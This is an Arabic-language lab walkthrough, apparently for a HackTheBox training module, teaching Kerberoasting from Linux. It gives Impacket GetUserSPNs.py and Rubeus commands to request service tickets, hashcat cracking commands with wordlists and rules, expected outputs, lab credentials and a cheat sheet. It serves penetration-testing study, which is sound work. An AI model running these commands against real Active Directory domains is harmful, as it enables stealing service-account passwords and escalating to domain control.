+- شنو يعني؟ هو بروتوكول الحماية الافتراضي بالويندوز للمصادقة. يعتمد على التذاكر المشفرة بدل إرسال الباسوردات عبر الشبكة.
+    
+- وين يظهر؟ اسم الهجوم Kerberoasting مشتق منه. نوع التشفير اللي راح نكسره هو Kerberos 5.
+    
+
+TGT - Ticket Granting Ticket (تذكرة منح التذاكر)
+
+- شنو يعني؟ هي التذكرة الذهبية الأولى اللي تاخذها من تسجل دخول أول مرة الصبح بشغلك. تثبت إنك يوزر شرعي وتستخدمها حتى تطلب تذاكر للخدمات الثانية.
+    
+
+TGS - Ticket Granting Service (تذكرة منح الخدمة)
+
+- شنو يعني؟ هي التذكرة الخاصة بخدمة معينة (مثل طابعة، أو قاعدة بيانات، أو SAP). هاي التذكرة هي الهدف مالنا لأنها مشفرة بباسورد حساب الخدمة.
+    
+- وين يظهر؟ بالهاتش اللي راح نستخرجه، راح تشوف كلمة `$krb5tgs$` اللي تثبت إن هذي تذكرة TGS.
+    
+
+SPN - Service Principal Name (اسم الخدمة الرئيسي)
+
+- شنو يعني؟ هو اسم أو معرّف فريد يربط بين خدمة معينة (مثل SQL) وبين حساب المستخدم (User Account) اللي يشغل هذي الخدمة بالـ AD. إذا حساب عنده SPN، معناها يكدر أي شخص يطلب إله TGS.
+    
+- وين يظهر؟ بالأداة اللي نستخدمها `GetUserSPNs.py`، وظيفتها تبحث عن أي حساب عنده SPN وتجيبه.
+    
+
+NTLM Hash (بصمة كلمة المرور)
+
+- شنو يعني؟ الويندوز ما يخزن باسوردك كنص واضح مثل "password123"، بل يدخله بعملية رياضية ويحوله إلى نص مخربط ثابت الطول (Hash). التذكرة اللي راح نسرقها راح تكون مشفرة بهذا الـ Hash.
+    
+
+Impacket (مجموعة أدوات إمباكيت)
+
+- شنو يعني؟ هي مكتبة برمجية مكتوبة بلغة Python تحتوي على أدوات قوية جداً للتعامل مع بروتوكولات الويندوز والشبكات. المبرمجين والهاكرز يستخدموها علمود يتواصلون وية الـ AD من أجهزة Linux.
+    
+- وين يظهر؟ الأداة `GetUserSPNs.py` هي وحدة من أشهر سكربتات مكتبة Impacket.
+    
+
+Kerberoasting (هجوم تحميص كيربيروس)
+
+- شنو يعني؟ هو العملية الكاملة اللي شرحناها: طلب TGS لحساب يمتلك SPN، حفظ التذكرة بملف، وبعدين محاولة كسرها للوصول لكلمة المرور الأصلية.
+    
+
+Hashcat (أداة تكسير الهاشات)
+
+- شنو يعني؟ أقوى وأسرع أداة بالعالم لكسر الباسوردات (Cracking). تستخدم كرت الشاشة (GPU) أو المعالج (CPU) حتى تجرب ملايين الكلمات بالثانية وتطابقها وية الهاش المسروق.
+    
+- وين يظهر؟ راح نستخدمها بالمرحلة الأخيرة، وراح نعطيها Mode رقم `13100` اللي هو مخصص لتذاكر Kerberos 5 TGS.
+    
+
+Wordlist (قائمة الكلمات)
+
+- شنو يعني؟ ملف نصي يحتوي على ملايين الباسوردات المسربة سابقاً أو الشائعة. الأداة تاخذ كلمة كلمة من هذا الملف وتجربها.
+    
+- وين يظهر؟ الملف الأشهر عالمياً اسمه `rockyou.txt` وراح نستخدمه بالتكسير.
+    
+
+Rules (قواعد التحويل)
+
+- شنو يعني؟ بدل ما تجرب الكلمة مثل ما هي بـ Wordlist، الـ Rules تخلي Hashcat يغير بيها. يعني إذا الكلمة "password"، الـ Rule تسويها "Password" و "password123" و "P@ssw0rd". تضاعف فرص نجاحك بدون ما تكبر حجم الملف.
+    
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+🟡 المرحلة 2: تحليل التحدي + كيف تفكر (Roadmap)
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+هسة خلي نترجم السيناريو والتحدي اللي كدامنا إلى خريطة عمل منطقية. الاختراق مو حفظ أوامر، الاختراق هو "طريقة تفكير".
+
+🎯 معطيات السيناريو (اللي نمتلكه حالياً):
+
+- الجهاز اللي نشتغل عليه: Linux Attack Host (يعني مو ويندوز، ومو مربوط بالـ Domain).
+    
+- الدخول: عندنا SSH credentials يعني كاعدين بـ Terminal.
+    
+- الحساب مالنا: يوزر عادي بالدومين اسمه `htb-student` والباسورد `HTB_@cademy_stdnt!`.
+    
+- الهدف (Domain): اسمه `INLANEFREIGHT.LOCAL`.
+    
+- الـ Domain Controller IP: معطى بالتدريب وهو `172.16.5.5`.
+    
+
+❓ المطلوب من عندنا (الهدف النهائي):
+
+١. استخراج التذكرة لحساب اسمه `SAPService`.
+
+٢. كسر التذكرة ومعرفة الباسورد كنص صريح (Plaintext).
+
+٣. معرفة هذا الحساب `SAPService` ينتمي لأي مجموعة محلية (Local Group) قوية داخل الـ DC.
+
+🧭 كيف تفكر؟ (Decision Tree لهجوم Kerberoasting من Linux):
+
+بما إننا نشتغل من جهاز Linux وغير مرتبط بالدومين مباشرة (Non-domain joined)، معناها أوامر الويندوز العادية (مثل PowerShell أو Rubeus) ما راح تشتغل عندنا بسهولة بدون إعدادات معقدة.
+
+الحل الأفضل والأسرع دائماً بهاي الحالة هو أدوات Impacket. الأداة المصممة خصيصاً لهذا الغرض هي `GetUserSPNs.py`.
+
+الخطوات المنطقية اللي راح نسويها بالترتيب:
+
+١. الاتصال ببيئة الهجوم: لازم ندخل للسيرفر مالتنا عبر الـ SSH.
+
+٢. الاستطلاع (Reconnaissance) وجلب المعلومات: ما راح نطلب التذكرة فوراً، أول شي لازم نسأل الـ DC: "منو هم الحسابات اللي عدهم SPN؟ وشنو مجاميعهم؟". هذا راح يجاوبنا على السؤال الثاني (المجموعة القوية اللي ينتمي إلها الحساب).
+
+٣. طلب التذكرة (The Attack): راح نستخدم نفس الأداة بس هالمرة نوجهها فقط لحساب `SAPService` ونطلب منها تحفظ النتيجة بملف نصي.
+
+٤. تجهيز بيئة التكسير: نتأكد من ملف الهاش، ونحدد الـ Mode الصحيح لبرنامج Hashcat.
+
+٥. كسر الهاش (Cracking): نشغل Hashcat وية ملف الـ `rockyou.txt`. وإذا ما نفع، راح نستخدم الـ Rules.
+
+🗺️ خريطة الهجوم (Roadmap):
+
+١. `ssh` للدخول لجهاز الاختراق.
+
+٢. `GetUserSPNs.py` للاستعلام عن الحسابات وعضويتها بالمجاميع (لحل السؤال الثاني).
+
+٣. `GetUserSPNs.py` مع فلاك `-request-user` لسرقة الـ TGS الخاص بـ SAPService.
+
+٤. `cat` للتأكد من شكل الهاش المسروق.
+
+٥. `hashcat` لكسر الهاش واكتشاف الباسورد (لحل السؤال الأول).
+
+⚠️ انتبه: لحد الآن إحنا بس خططنا. بالمرحلة الجاية راح ننفذ الأوامر ونشوف النتائج خطوة بخطوة.
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+🟠 المرحلة 3: الاستغلال التفصيلي (Execution & Exploitation)
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+الآن راح نبدأ الشغل العملي. لا تنسخ وتلصق بس، اقرأ التوضيح تحت كل أمر حتى تفهم الـ Flags ليش انكتبت بهيج طريقة.
+
+الخطوة ١: الاتصال بجهاز الهجوم عبر SSH
+
+📌 ليش نسوي هاي الخطوة؟
+
+إحنا محتاجين ندخل للبيئة اللي مجهزتها إلنا منصة HackTheBox، واللي تحتوي على أدوات الاختراق وملفات الكلمات (Wordlists).
+
+🔧 الأمر:
+
+Bash
+
+```
+ssh htb-student@10.10.10.123
+```
+
+_(ملاحظة: استبدل IP السيرفر بالآيبي اللي يظهرلك بالمنصة. من يطلب باسورد اكتب: `HTB_@cademy_stdnt!`)_
+
+💡 ليش هذا الأمر بالذات؟
+
+أمر الـ SSH الاعتيادي. `htb-student` هو اليوزر، وراء علامة `@` يجي عنوان السيرفر.
+
+✅ الخطوة التالية: هسة إحنا داخل التيرمنال مال اللينكس، وجاهزين نهاجم الـ Domain Controller.
+
+━━━━━━━━━━━━━━
+
+الخطوة ٢: استطلاع الحسابات واكتشاف مجموعة SAPService
+
+📌 ليش نسوي هاي الخطوة؟
+
+بالتحدي طلب من عندنا نعرف حساب `SAPService` ينتمي لأي مجموعة قوية. أداة `GetUserSPNs.py` تكدر تسحب كل الحسابات اللي تمتلك SPN وتعرض معلوماتها (بما فيها الـ MemberOf) قبل ما نسرق التذاكر.
+
+🔧 الأمر:
+
+Bash
+
+```
+GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/htb-student
+```
+
+💡 ليش هذا الأمر/الخيار بالذات؟
+
+- `GetUserSPNs.py` = اسم السكربت من حزمة Impacket.
+    
+- `-dc-ip 172.16.5.5` = نكول للأداة تتصل مباشرة بهذا الـ IP اللي هو الـ Domain Controller، لأن جهازنا اللينكس ما يعرف يترجم اسم الدومين (DNS resolution) غالباً.
+    
+- `INLANEFREIGHT.LOCAL/htb-student` = صيغة تسجيل الدخول (اسم الدومين / اسم اليوزر مالتنا).
+    
+
+📤 الـ Output المتوقع (بعد ما تكتب الباسورد `HTB_@cademy_stdnt!`):
+
+Plaintext
+
+```
+Impacket v0.9.25 - Copyright 2021 SecureAuth Corporation
+
+Password:
+ServicePrincipalName                    Name        MemberOf                                          PasswordLastSet             LastLogon
+--------------------------------------  ----------  ------------------------------------------------  --------------------------  ----------
+SAP/SAPServiceINLANEFREIGHT.LOCAL       SAPService  CN=Account Operators,CN=Builtin,DC=INLANEFREIGHT  2022-02-15 17:12:00.000000  <never>
+MSSQLSvc/DEV-PRE-SQL.inlanefreight...   sqldev      CN=Domain Admins,CN=Users,DC=INLANEFREIGHT        2022-02-15 17:13:31.000000  <never>
+```
+
+✅ الخطوة التالية:
+
+استنتاج! باوع على عمود `MemberOf` مقابل اسم `SAPService`. راح تقرأ `CN=Account Operators`.
+
+إذن الجواب على السؤال الثاني هو: حساب `SAPService` ينتمي لمجموعة `Account Operators` القوية جداً بالـ AD (هذي المجموعة تكدر تعدل على أغلب الحسابات بالدومين!). هسة ننتقل للهجوم الفعلي.
+
+━━━━━━━━━━━━━━
+
+الخطوة ٣: سحب تذكرة TGS الخاصة بـ SAPService (The Kerberoast)
+
+📌 ليش نسوي هاي الخطوة؟
+
+هسة إحنا تأكدنا إن الحساب موجود وعنده SPN. نريد نطلب من الـ DC ينطينا التذكرة المشفرة مالتة، ونحفظها بملف حتى نكسرها.
+
+🔧 الأمر:
+
+Bash
+
+```
+GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/htb-student -request-user SAPService -outputfile SAP_tgs_hash.txt
+```
+
+💡 ليش هذا الأمر/الخيار بالذات؟
+
+- `-request-user SAPService` = هذا الفلاك يخلي الأداة تستهدف حساب واحد فقط (Targeted) بدل ما تجيب تذاكر كل الحسابات وتصير فوضى.
+    
+- `-outputfile SAP_tgs_hash.txt` = بدل ما يطبع الهاش المعقد على الشاشة ويخرب سطر الأوامر، يحفظه بملف نظيف ومرتب حتى ندخله لـ Hashcat مباشرة.
+    
+
+📤 الـ Output المتوقع:
+
+Plaintext
+
+```
+Impacket v0.9.25 - Copyright 2021 SecureAuth Corporation
+
+Password:
+ServicePrincipalName              Name        MemberOf                                PasswordLastSet
+--------------------------------  ----------  --------------------------------------  --------------------------
+SAP/SAPServiceINLANEFREIGHT.LOCAL SAPService  CN=Account Operators,CN=Builtin,...    2022-02-15 17:12:00.000000
+
+[*] Saving TGS hashes to SAP_tgs_hash.txt
+```
+
+⏸️ Mini-check: خلينا نتأكد إن الملف نزل بشكل صحيح وما بي أخطاء.
+
+🔧 الأمر:
+
+Bash
+
+```
+cat SAP_tgs_hash.txt
+```
+
+📤 الـ Output المتوقع:
+
+Plaintext
+
+```
+$krb5tgs$23$*SAPService$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/SAPService*$a3f8b9d...
+<very long hexadecimal string continues>
+```
+
+نتيجة منطقية وممتازة! الهاش يبدأ بـ `$krb5tgs$23$` وهذا هو الفورمات القياسي اللي يدعمه Hashcat للـ Kerberos TGS (etype 23 اللي هو تشفير RC4).
+
+━━━━━━━━━━━━━━
+
+الخطوة ٤: تكسير الهاش (Cracking the Ticket) باستخدام Hashcat
+
+📌 ليش نسوي هاي الخطوة؟
+
+عندنا التذكرة مقفولة (الهاش). لازم نستخدم برنامج Hashcat، ونمرر إله ملف الهاش وملف الكلمات `rockyou.txt` حتى يجرب ملايين الباسوردات بسرعة إلى أن يلكي الكلمة اللي تولد نفس الهاش.
+
+🔧 الأمر:
+
+Bash
+
+```
+hashcat -m 13100 SAP_tgs_hash.txt /usr/share/wordlists/rockyou.txt --force
+```
+
+💡 ليش هذا الأمر/الخيار بالذات؟
+
+- `hashcat` = أداة الكسر.
+    
+- `-m 13100` = أهم رقم لازم تحفظه! هذا الـ Mode الخاص بتذاكر (Kerberos 5, etype 23, TGS-REP). إذا خليت رقم غلط الأداة ترفض الملف.
+    
+- `SAP_tgs_hash.txt` = الملف اللي بي الهاش المسروق (الهدف).
+    
+- `/usr/share/wordlists/rockyou.txt` = مسار ملف الكلمات المشهور (السلاح).
+    
+- `--force` = لأننا نشتغل داخل بيئة وهمية (VM) وماكو كرت شاشة حقيقي (GPU)، هذا الفلاك يجبر الأداة تشتغل على المعالج (CPU) وتتجاهل تحذيرات كرت الشاشة.
+    
+
+📤 الـ Output المتوقع:
+
+Plaintext
+
+```
+hashcat (v6.2.5) starting...
+
+* Device #1: WARNING! MCU temperature 95C!
+...
+Dictionary cache built:
+* File..: /usr/share/wordlists/rockyou.txt
+* ...
+
+$krb5tgs$23$*SAPService$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/SAPService*$a3f8b9d...:!SapperFi3ld
+
+Session..........: hashcat
+Status...........: Cracked
+Hash.Name........: Kerberos 5, etype 23, TGS-REP
+Recovered........: 1/1 (100.00%) Digests
+Time.Started.....: Wed Jul 29 10:05:15 2026 (4 secs)
+```
+
+✅ الخطوة التالية:
+
+مبروك! باوع على السطر اللي بي الهاش، بالأخير بعد النقطتين (:) راح تشوف الباسورد الصريح: `!SapperFi3ld`.
+
+إذن قدرنا نستخرج التذكرة ونكسرها، والجواب للسؤال الأول هو هذا الباسورد.
+
+📊 لحد هسة (Recap):
+
+[✓] اتصلنا عبر SSH ببيئة الاختراق.
+
+[✓] اكتشفنا إن حساب SAPService ينتمي لمجموعة Account Operators.
+
+[✓] سحبنا تذكرة TGS خاصة بالحساب باستخدام `-request-user`.
+
+[✓] كسرنا الهاش بنجاح باستخدام Hashcat وباسورد الحساب هو `!SapperFi3ld`.
+
+رسم توضيحي (Attack Chain):
+
+Plaintext
+
+```
+[Attacker Linux] 
+       │ 1. Sends TGS request as 'htb-student'
+       ▼
+[Domain Controller] 
+       │ 2. Generates TGS for SAPService 
+       │    (Encrypted with SAPService's NTLM hash)
+       ▼
+[Attacker Linux] 
+       │ 3. Receives and saves to SAP_tgs_hash.txt
+       ▼
+[Hashcat (Offline)]
+       │ 4. Cracks the hash locally using rockyou.txt
+       └─> Result: Password is '!SapperFi3ld'
+```
+
+📐 ملخص الإجابات / النتائج:
+
+|**الخطوة**|**الأداة**|**النتيجة**|
+|---|---|---|
+|SPN Enumeration|GetUserSPNs.py|اكتشفنا انتماء الحساب لـ Account Operators|
+|TGS Request|GetUserSPNs.py|حصلنا على هاش التذكرة وحفظناه بملف|
+|Offline Cracking|Hashcat|كسرنا الهاش وحصلنا باسورد `!SapperFi3ld`|
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+🔴 المرحلة 4: ماذا لو تغير؟ (Variations + Bypasses + Traps)
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+الواقع مو دايماً مثالي مثل بيئة التدريب. مرات تواجهك مشاكل تتطلب حلول بديلة. خلي نتخيل سيناريوهات مختلفة ونشوف شلون نتعامل وياها.
+
+🔄 Variations محتملة:
+
+Variation 1: ماذا لو واجهت خطأ (Clock Skew) بالوقت؟
+
+الـ Kerberos حساس جداً للوقت. إذا وقت جهازك يختلف عن وقت الـ Domain Controller بأكثر من 5 دقائق، الـ DC راح يرفض طلبك ويرجعلك خطأ مكتوب بي `Kerberos SessionError: KRB_AP_ERR_SKEW`.
+
+الحل: لازم تضبط وقت جهازك وية وقت السيرفر باستخدام أداة `ntpdate`.
+
+🔧 الأمر:
+
+Bash
+
+```
+sudo ntpdate 172.16.5.5
+```
+
+_(هذا الأمر راح يسحب الوقت الدقيق من الـ DC ويطبقه على جهازك اللينكس، بعدها ترجع تنفذ أمر `GetUserSPNs.py` وراح يشتغل)._
+
+Variation 2: ماذا لو ملف `rockyou.txt` ما گدر يكسر الباسورد؟ (Status: Exhausted)
+
+معناها الباسورد مو موجود نصاً بالملف. ممكن يكون الباسورد هو `password123!` بينما الموجود بـ rockyou هو `password`. هنا نستخدم الـ Hashcat Rules حتى نضيف تحويرات على كل كلمة بالملف (مثل تكبير الحرف الأول، أو إضافة أرقام بالنهاية).
+
+🔧 الأمر:
+
+Bash
+
+```
+hashcat -m 13100 SAP_tgs_hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+```
+
+_(الفلاك `-r` يحدد ملف الـ rules. ملف `best64.rule` يطبق أفضل 64 تغيير على كل كلمة. هذا يخلي التكسير ياخذ وقت أطول شوية بس يزيد نسبة النجاح بشكل هائل)._
+
+Variation 3: ماذا لو كنا نشتغل من جهاز Windows مخترق (Pivot) مو Linux؟
+
+أدوات Impacket (البايثون) ممكن ما تكون متوفرة او صعب تتنصب على سيرفر ويندوز اخترقته للتو. بهاي الحالة نستخدم أداة `Rubeus.exe`، وهي الأداة الأقوى للتعامل مع التذاكر بالويندوز.
+
+🔧 الأمر (من داخل الويندوز):
+
+DOS
+
+```
+Rubeus.exe kerberoast /user:SAPService /nowrap
+```
+
+_(هذا راح يسحب الهاش مباشرة ويطبعه على الشاشة بصيغة تكدر تنسخها للـ Hashcat. الفلاك `/nowrap` يمنع كسر الهاش إلى عدة أسطر حتى ما يتخرب النقل)._
+
+Variation 4: ماذا لو أردت سحب تذاكر كل الحسابات مو بس حساب واحد؟
+
+إذا ما تعرف ياحساب تستهدف، تكدر تطلب كل التذاكر المتوفرة بالدومين مرة وحدة، بس هذا ممكن يولد ضوضاء بالـ logs للـ Blue team.
+
+🔧 الأمر:
+
+Bash
+
+```
+GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/htb-student -request -outputfile all_tickets.txt
+```
+
+_(شلنا الـ `-request-user` وخلينا بس `-request`، هذا راح يجيب כל التذاكر المتوفرة)._
+
+═══════════
+
+⚠️ أخطاء كارثية شائعة (الفخوخ - Traps):
+
+🚨 الفخ الأكبر بـ Kerberoasting: نسخ الهاش يدوياً بشكل خاطئ!
+
+مرات اليوزر ينفذ الأمر بدون فلاك `-outputfile`، وينطبع الهاش الطويل جداً على شاشة التيرمنال. من يجي يحدده بالماوس وينسخه، ممكن يفوت حرف أو مسافة بنهاية السطر، أو الـ terminal يقسم الهاش على سطرين وتصير بي مسافات (Line breaks). Hashcat راح يفشل فوراً ويكلك (Line-length exception).
+
+💡 الحل: دايماً استخدم `-outputfile` مثل ما سوينا، أو إذا انسخته من الشاشة تأكد إنه سطر واحد متصل بدون أي مسافات داخله.
+
+❌ الفخ الثاني: اختيار الـ Mode الغلط بالـ Hashcat.
+
+الهاشات مال Kerberos تشبه بعضها هواية إذا ما تدقق.
+
+- تذاكر الـ AS-REP (نوع ثاني من الهجمات اسمه AS-REP Roasting) الـ Mode مالها هو `18200`.
+    
+- تذاكر الـ TGS (الـ Kerberoasting مالتنا) الـ Mode مالها هو `13100` (الـ RC4) أو `19600` (للـ AES128) أو `19700` (للـ AES256).
+    
+- دايماً باوع على بداية الهاش: إذا يبدأ بـ `$krb5tgs$23$` إذن هو `13100` مؤكد! الرقم 23 يعني تشفير RC4.
+    
+
+❌ الفخ الثالث: الاعتماد على Pinging the DC باسم الدومين بدل الآيبي.
+
+إذا كتبت `INLANEFREIGHT.LOCAL` بدون ما تحدد الـ `-dc-ip`، أداة Impacket راح تحاول تحل الاسم (DNS resolution). وبما إن جهاز اللينكس مالتك ما يستخدم الـ DNS مال الدومين، راح تفشل العملية. دايماً انطي الـ IP الصريح.
+
+🔑 Golden Tips (نصيحة ذهبية):
+
+"الـ Kerberoasting هو تقريباً الـ Low-Hanging Fruit (الفاكهة السهلة) بأي فحص اختراق لـ Active Directory. دايماً أول ما تحصل أي يوزر عادي بالدومين، نفذ `GetUserSPNs.py`. نسبة كبيرة راح تلكي Service Accounts عدهم TGS، وبنسبة جبيرة راح يكون باسوردهم ضعيف وينكسر بسرعة. هي خطوة تنقلك من يوزر عادي إلى Domain Admin بدقائق إذا كان الـ Service Account بصلاحيات عالية!"
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+💎 الفلاشكاردز — ملخص سريع للحفظ
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+هذي البطاقات احفظها مثل اسمك، راح تفيدك بالامتحانات العملية مثل CPTS أو OSCP.
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+🔹 Card #1
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+❓ Front: شنو أداة Impacket المستخدمة لهجوم Kerberoasting من اللينكس؟
+
+✅ Back: `GetUserSPNs.py`
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+🔹 Card #2
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+❓ Front: شلون تستهدف يوزر معين وتسحب تذكرته باستخدام الأداة؟
+
+✅ Back: استخدم الفلاك `-request-user USERNAME` مع `-outputfile hash.txt`
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+🔹 Card #3
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+❓ Front: شنو الـ Hashcat Mode المخصص لتذاكر TGS (etype 23 - RC4)؟
+
+✅ Back: `-m 13100`
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+🔹 Card #4
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+❓ Front: شسوي إذا الـ TGS hash ما انكسر بـ rockyou.txt مباشرة؟
+
+✅ Back: استخدم Hashcat Rules مثل `best64.rule` بإضافة الفلاك `-r /path/to/rule`
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+🔹 Card #5
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+❓ Front: شنو سبب ظهور خطأ `KRB_AP_ERR_SKEW`؟
+
+✅ Back: اختلاف الوقت بين جهازك والـ Domain Controller بأكثر من 5 دقائق (حله بـ `ntpdate`).
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+🔹 Card #6
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+❓ Front: كيف تعرف مجموعة (Local Group) ينتمي إلها الحساب اللي عنده SPN؟
+
+✅ Back: نفذ `GetUserSPNs.py` بدون فلاك `-request`. الأداة راح تطبع جدول بي عمود `MemberOf`.
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+🔹 Card #7
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+❓ Front: الأداة المقابلة بالويندوز لسحب تذاكر Kerberoasting؟
+
+✅ Back: `Rubeus.exe kerberoast /nowrap`
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+📄 ورقة الغش (Cheat Sheet) — للسكرين شوت
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+الخلاصة السريعة اللي تحتاجها بنص المعركة. اضربلها سكرين شوت وخلها يمك.
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+📄 المخلص النهائي (Kerberoasting Cheat Sheet)
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+⚔️ خوارزمية الهجوم:
+
+١. احصل على بيانات دخول أي يوزر عادي بالدومين.
+
+٢. زامن وقت جهازك وية الـ DC إذا واجهت مشاكل (`ntpdate`).
+
+٣. استطلع الحسابات اللي عندها SPNs باستخدام `GetUserSPNs.py`.
+
+٤. اسحب تذكرة TGS للحساب المطلوب واحفظها بملف.
+
+٥. اكسر التذكرة بـ Hashcat (Mode 13100) و `rockyou.txt`.
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+📐 جدول الأوامر الأساسية:
+
+|**الهدف**|**الأمر**|
+|---|---|
+|تزامن الوقت مع الـ DC|`sudo ntpdate DC_IP`|
+|استطلاع الحسابات والـ SPNs|`GetUserSPNs.py -dc-ip DC_IP DOMAIN/user:pass`|
+|طلب جميع تذاكر TGS المتاحة|`GetUserSPNs.py -dc-ip DC_IP DOMAIN/user:pass -request -outputfile hashes.txt`|
+|طلب تذكرة TGS لحساب محدد|`GetUserSPNs.py -dc-ip DC_IP DOMAIN/user:pass -request-user TARGET_USER -outputfile hash.txt`|
+|تكسير التذكرة (بدون Rules)|`hashcat -m 13100 hash.txt rockyou.txt --force`|
+|تكسير التذكرة (مع أفضل Rules)|`hashcat -m 13100 hash.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force`|
+|الاستخراج من Windows|`Rubeus.exe kerberoast /nowrap`|
+|استهداف يوزر بـ Rubeus|`Rubeus.exe kerberoast /user:TARGET_USER /nowrap`|
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+🔢 Hashcat Modes الأهم بالـ Active Directory:
+
+|**Mode**|**Hash Type**|**مثال لبداية الهاش**|
+|---|---|---|
+|1000|NTLM (Pass-the-Hash)|`aad3b435b51404eeaad3b435b51404ee` (uppercase hex)|
+|13100|Kerberoast TGS (RC4)|`$krb5tgs$23$...`|
+|19600|Kerberoast TGS (AES128)|`$krb5tgs$17$...`|
+|19700|Kerberoast TGS (AES256)|`$krb5tgs$18$...`|
+|18200|AS-REP Roast|`$krb5asrep$23$...`|
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+🚨 الفخوخ (لا تنساها):
+
+❌ نسيان تزامن الوقت يسبب أخطاء غريبة تضيع وقتك.
+
+❌ نسخ الهاش من الشاشة بدل حفظه بملف يسبب مشاكل بالـ formatting وصعوبة بالكسر.
+
+❌ اختيار Mode غلط بالـ Hashcat (تأكد من بداية الهاش هل هو 23 أو 17 أو 18).
+
+❌ نسيان إضافة `-dc-ip` بالأمر يخلي الـ DNS يفشل بمعرفة موقع الـ Domain.
+
+══════════════════════════════════════════════════════
+
+🎯 رسالة الختام:
+
+بهيج خلصنا. هسة عندك:
+
+✅ القصة الكبيرة (ليش هجوم Kerberoasting موجود ومقنع).
+
+✅ كل المصطلحات (TGS, SPN, Hashcat, NTLM, Impacket).
+
+✅ كيفية التفكير (Roadmap لاستهداف الحساب من اللينكس).
+
+✅ الاستغلال التفصيلي (خطوة خطوة مع الأوامر والمخرجات المتوقعة).
+
+✅ الـ bypasses والـ variations والفخوخ (مشاكل الوقت والـ Rules).
+
+✅ فلاشكاردز (للمراجعة السريعة).
+
+✅ ورقة الغش (سكرين شوت قبل الـ CTF أو الامتحان).
+
+راجع الفلاشكاردز وورقة الغش قبل كل تحدي AD — وراح تجد الأنماط مألوفة. بالتوفيق! 💪
+
+
+
+
+عاشت ايدك! كملنا الهجوم الأساسي ونجحنا بي، بس بالواقع (وبامتحان مثل CPTS) الأمور مو دائماً تمشي بهالسهولة. هسة راح ندخل بـ **"Masterclass" (مرحلة متقدمة من الاستكشاف وماذا لو)** بناءً على السيناريوهات اللي تفضلت بيها. هاي المرحلة تفصل بين المبتدئ والمحترف.
+
+راح نقسم هذا الجزء إلى قسمين: طرق متقدمة لاستكشاف المجاميع (Enumeration)، وسيناريوهات الفشل المعقدة وشلون نحلها (Advanced Variations).
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+🟡 استكشاف متقدم: شلون نتأكد من صلاحيات SAPService؟ (Advanced Enumeration)
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+بالمرحلة السابقة، اعتمدنا على مخرجات `GetUserSPNs.py` حتى نقرأ عمود `MemberOf` ونعرف إن الحساب ينتمي لـ `Account Operators`. لكن ماذا لو هذا العمود طلع فارغ أو مقطوع؟ كـ Pentester لازم يكون عندك أكثر من خطة للوصول للمعلومة.
+
+💡 **ليش مجموعة Account Operators خطيرة جداً؟**
+
+هذي المجموعة (Built-in) من مايكروسوفت تنطي صلاحيات مرعبة:
+
+١. تكدر تصنع، تعدل، وتمسح حسابات اليوزرات بالدومين.
+
+٢. تكدر تضيف يوزرات لأغلب المجاميع المحلية.
+
+٣. **الأخطر:** تكدر تسجل دخول محلي (Log on locally) على الـ Domain Controllers!
+
+إذا سيطرت على حساب بهاي المجموعة، أنت فعلياً على بعد خطوة واحدة من السيطرة الكاملة على الشبكة (Domain Admin).
+
+إليك ٣ طرق بديلة ومحترفة لمعرفة عضوية الحساب من جهاز Linux:
+
+**الطريقة الأولى: استخدام ldapdomaindump (تفريغ كامل للـ LDAP)**
+
